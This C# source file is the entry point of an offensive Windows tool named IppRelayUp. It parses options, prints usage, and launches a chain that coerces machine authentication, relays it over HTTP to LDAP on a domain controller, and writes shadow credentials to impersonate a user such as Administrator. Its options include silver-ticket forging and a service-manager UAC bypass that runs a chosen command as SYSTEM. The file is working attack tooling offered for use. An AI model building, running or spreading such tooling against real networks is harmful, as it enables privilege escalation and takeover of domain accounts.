using Httprelayserver.AuthTrigger;


namespace HttpLdapRelay
{
    /// <summary>
    /// HTTP to LDAP Relay - Similar to Impacket's ntlmrelayx
    /// Captures HTTP authentication (from WebClient) and relays to LDAP
    /// </summary>
    class Program
    {
        static int Main(string[] args)
        {
            // Handle SCM UAC Bypass worker modes (must be checked first)
            if (args.Length > 0)
            {
                if (args[0] == "--scm-worker")
                {
                    // Worker process running in new logon session
                    return SCMUACBypass.WorkerMain(args);
                }
                else if (args[0] == "--run-system" && args.Length > 1)
                {
                    // Service callback to spawn SYSTEM process
                    uint sessionId = uint.Parse(args[1]);
                    return SCMUACBypass.RunSystemProcess(sessionId);
                }
            }

            Console.WriteLine(@"
╔═══════════════════════════════════════════════════════════════╗
║                        IppRelayUp                             ║
║          IppCoerce + LDAP Relay + Shadow Credentials          ║
╚═══════════════════════════════════════════════════════════════╝
");

            // Parse arguments
            int httpPort = 8080;
            string ldapTarget = null;
            int ldapPort = 389;
            bool useLdaps = false;
            bool verbose = false;
            bool showHelp = false;
            string listenAddress = "localhost";
            string command = null;  // Command for SCM UAC Bypass
            bool autoCoerce = true; // Automatic EFS coercion
            string userToImpseronate = "Administrator";
            string fullDomainName = "";
            bool forceOverwrite = false; // Force overwrite existing msDS-KeyCredentialLink
            bool useSilverTicket = false;


            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "-p":
                    case "--port":
                        if (i + 1 < args.Length)
                            int.TryParse(args[++i], out httpPort);
                        break;
                    case "-d":
                    case "--domain":
                        if (i + 1 < args.Length)
                            fullDomainName = args[++i];
                        break;
                    case "-t":
                    case "--target":
                        if (i + 1 < args.Length)
                            ldapTarget = args[++i];
                        break;
                    case "-u":
                    case "--user-to-impersonate":
                        if (i + 1 < args.Length)
                            userToImpseronate = args[++i];
                        break;
                    case "-lp":
                    case "--ldap-port":
                        if (i + 1 < args.Length)
                            int.TryParse(args[++i], out ldapPort);
                        break;
                    case "-s":
                    case "--ldaps":
                        useLdaps = true;
                        ldapPort = 636;
                        break;
                    case "-c":
                    case "--command":
                        if (i + 1 < args.Length)
                            command = args[++i];
                        break;
                    case "-f":
                    case "--force":
                        forceOverwrite = true;
                        break;
                    case "--silver":
                        useSilverTicket = true;
                        break;
                    case "-a":
                    case "--auto":
                    case "--coerce":
                        autoCoerce = false;
                        break;
                    case "-v":
                    case "--verbose":
                        verbose = true;
                        break;
                    case "-h":
                    case "--help":
                        showHelp = true;
                        break;
                }
            }

            // Shows "help" menu
            if (showHelp || string.IsNullOrEmpty(ldapTarget))
            {
                ShowHelp();
                return 0;
            }

            // Check if command is provided
            if (string.IsNullOrEmpty(command))
            {
                Console.WriteLine("[-] Missing command to execute...");
                return 0;
            }

            if (string.IsNullOrEmpty(fullDomainName))
            {
                Console.WriteLine("[-] Missing domain variable...");
                return 0;
            }

            Console.WriteLine($"[*] Configuration:");
            Console.WriteLine($"    HTTP Port:    {httpPort}");
            Console.WriteLine($"    LDAP Target:  {ldapTarget}");
            Console.WriteLine($"    LDAP Port:    {ldapPort}");
            Console.WriteLine($"    Use LDAPS:    {useLdaps}");
            Console.WriteLine($"    Verbose:      {verbose}");
            Console.WriteLine($"    Command:      {command}");
            Console.WriteLine($"    Domain:      {fullDomainName}");
            Console.WriteLine($"    Auto Coerce:  {autoCoerce}");
            Console.WriteLine($"    User to impersonate: {userToImpseronate}");
            Console.WriteLine($"    Silver ticket: {useSilverTicket}");
            Console.WriteLine();

            if (httpPort <= 1024)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] ERROR: Port {httpPort} requires Administrator privileges");
                Console.WriteLine("[!] Use port > 1024:");
                Console.ResetColor();
                return 0;
            }

            Console.WriteLine();

            try
            {
                var server = new HttpRelayServer(httpPort, ldapTarget, ldapPort, useLdaps, verbose, userToImpseronate, fullDomainName, listenAddress, command, forceOverwrite, useSilverTicket);
                Console.WriteLine();
                Console.WriteLine("[*] Starting HTTP Relay Server...");


                var serverThread = new Thread(() =>
                {
                    try
                    {
                        server.Start();
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!] Server error: {ex.Message}");
                        Console.ResetColor();
                    }
                });

                serverThread.IsBackground = false;
                serverThread.Start();

                Thread.Sleep(500);

                string serverUrl = $"http://127.0.0.1:{httpPort}/";

                // Start automatic coercion if enabled
                if (autoCoerce)
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[*] Auto-coercion enabled - will trigger IppCoerce in 2 seconds...");
                    Console.ResetColor();

                    // Start coercion asynchronously (non-blocking)
                    _ = IppCoerceTrigger.TriggerAsync(httpPort, 2000);
                }

                Console.WriteLine("╔════════════════════════════════════════════════════════════════╗");
                Console.WriteLine("║                  Server is Running                             ║");
                Console.WriteLine("╚════════════════════════════════════════════════════════════════╝");
                Console.WriteLine();
                Console.WriteLine($"[*] Listening on: http://localhost:{httpPort}/");
                Console.WriteLine($"[*] Relay target: {(useLdaps ? "ldaps" : "ldap")}://{ldapTarget}:{ldapPort}");
                Console.WriteLine();
                Console.WriteLine("[*] Waiting for incoming connections...");
                Console.WriteLine("[*] Press Ctrl+C to stop the server");
                Console.WriteLine();

                Console.CancelKeyPress += (sender, e) =>
                {
                    e.Cancel = true;
                    Console.WriteLine();
                    Console.WriteLine("[*] Shutting down...");
                    server.Stop();
                };

                serverThread.Join();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Fatal error: {ex.Message}");
                Console.ResetColor();

                if (verbose)
                {
                    Console.WriteLine($"[!] Stack trace: {ex.StackTrace}");
                }
            }

            Console.WriteLine("[*] Server stopped. Press any key to exit...");
            Console.ReadKey();
            return 0;
        }

        static void ShowHelp()
        {
            Console.WriteLine("Usage: IppRelayUp.exe -t <target> -c command [options]");
            Console.WriteLine();
            Console.WriteLine("Required Arguments:");
            Console.WriteLine("  -t, --target <host>                LDAP target server (e.g., dc01.contoso.local)");
            Console.WriteLine("  -c, --command <cmd>                Command to run as SYSTEM via SCM UAC Bypass");
            Console.WriteLine("  -d, --domain <domain>              Full domain name of the target (e.g. contoso.local)");
            Console.WriteLine();
            Console.WriteLine("Optional Arguments:");
            Console.WriteLine("  -p, --port <port>                  HTTP port to listen on (default: 8080)");
            Console.WriteLine("  -u, --user-to-impersonate <user>   The username you want to impersonate (default: Administrator)");
            Console.WriteLine("  --force                            /!\\ Warning /!\\ Force the change of ms-DSKeyCredentialLink attribute ");
            Console.WriteLine("  --silver                           UnPAC the machine NT hash and forge service tickets locally");
            Console.WriteLine("  -lp, --ldap-port <port>            LDAP port (default: 389, or 636 for LDAPS)");
            Console.WriteLine("  -s, --ldaps                        Use LDAPS instead of LDAP (default: false)");
            Console.WriteLine("  -a, --auto                         If used, disable auto-trigger IppCoerce coercion. Enabled by default.");
            Console.WriteLine("  -v, --verbose                      Enable verbose output");
            Console.WriteLine("  -h, --help                         Show this help message");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(" Usage example:");
            Console.ResetColor();
            Console.WriteLine("  IppRelayUp.exe -t dc01.contoso.local -d contoso.local -u Administrator -c cmd.exe");
            Console.WriteLine();
        }
    }
}
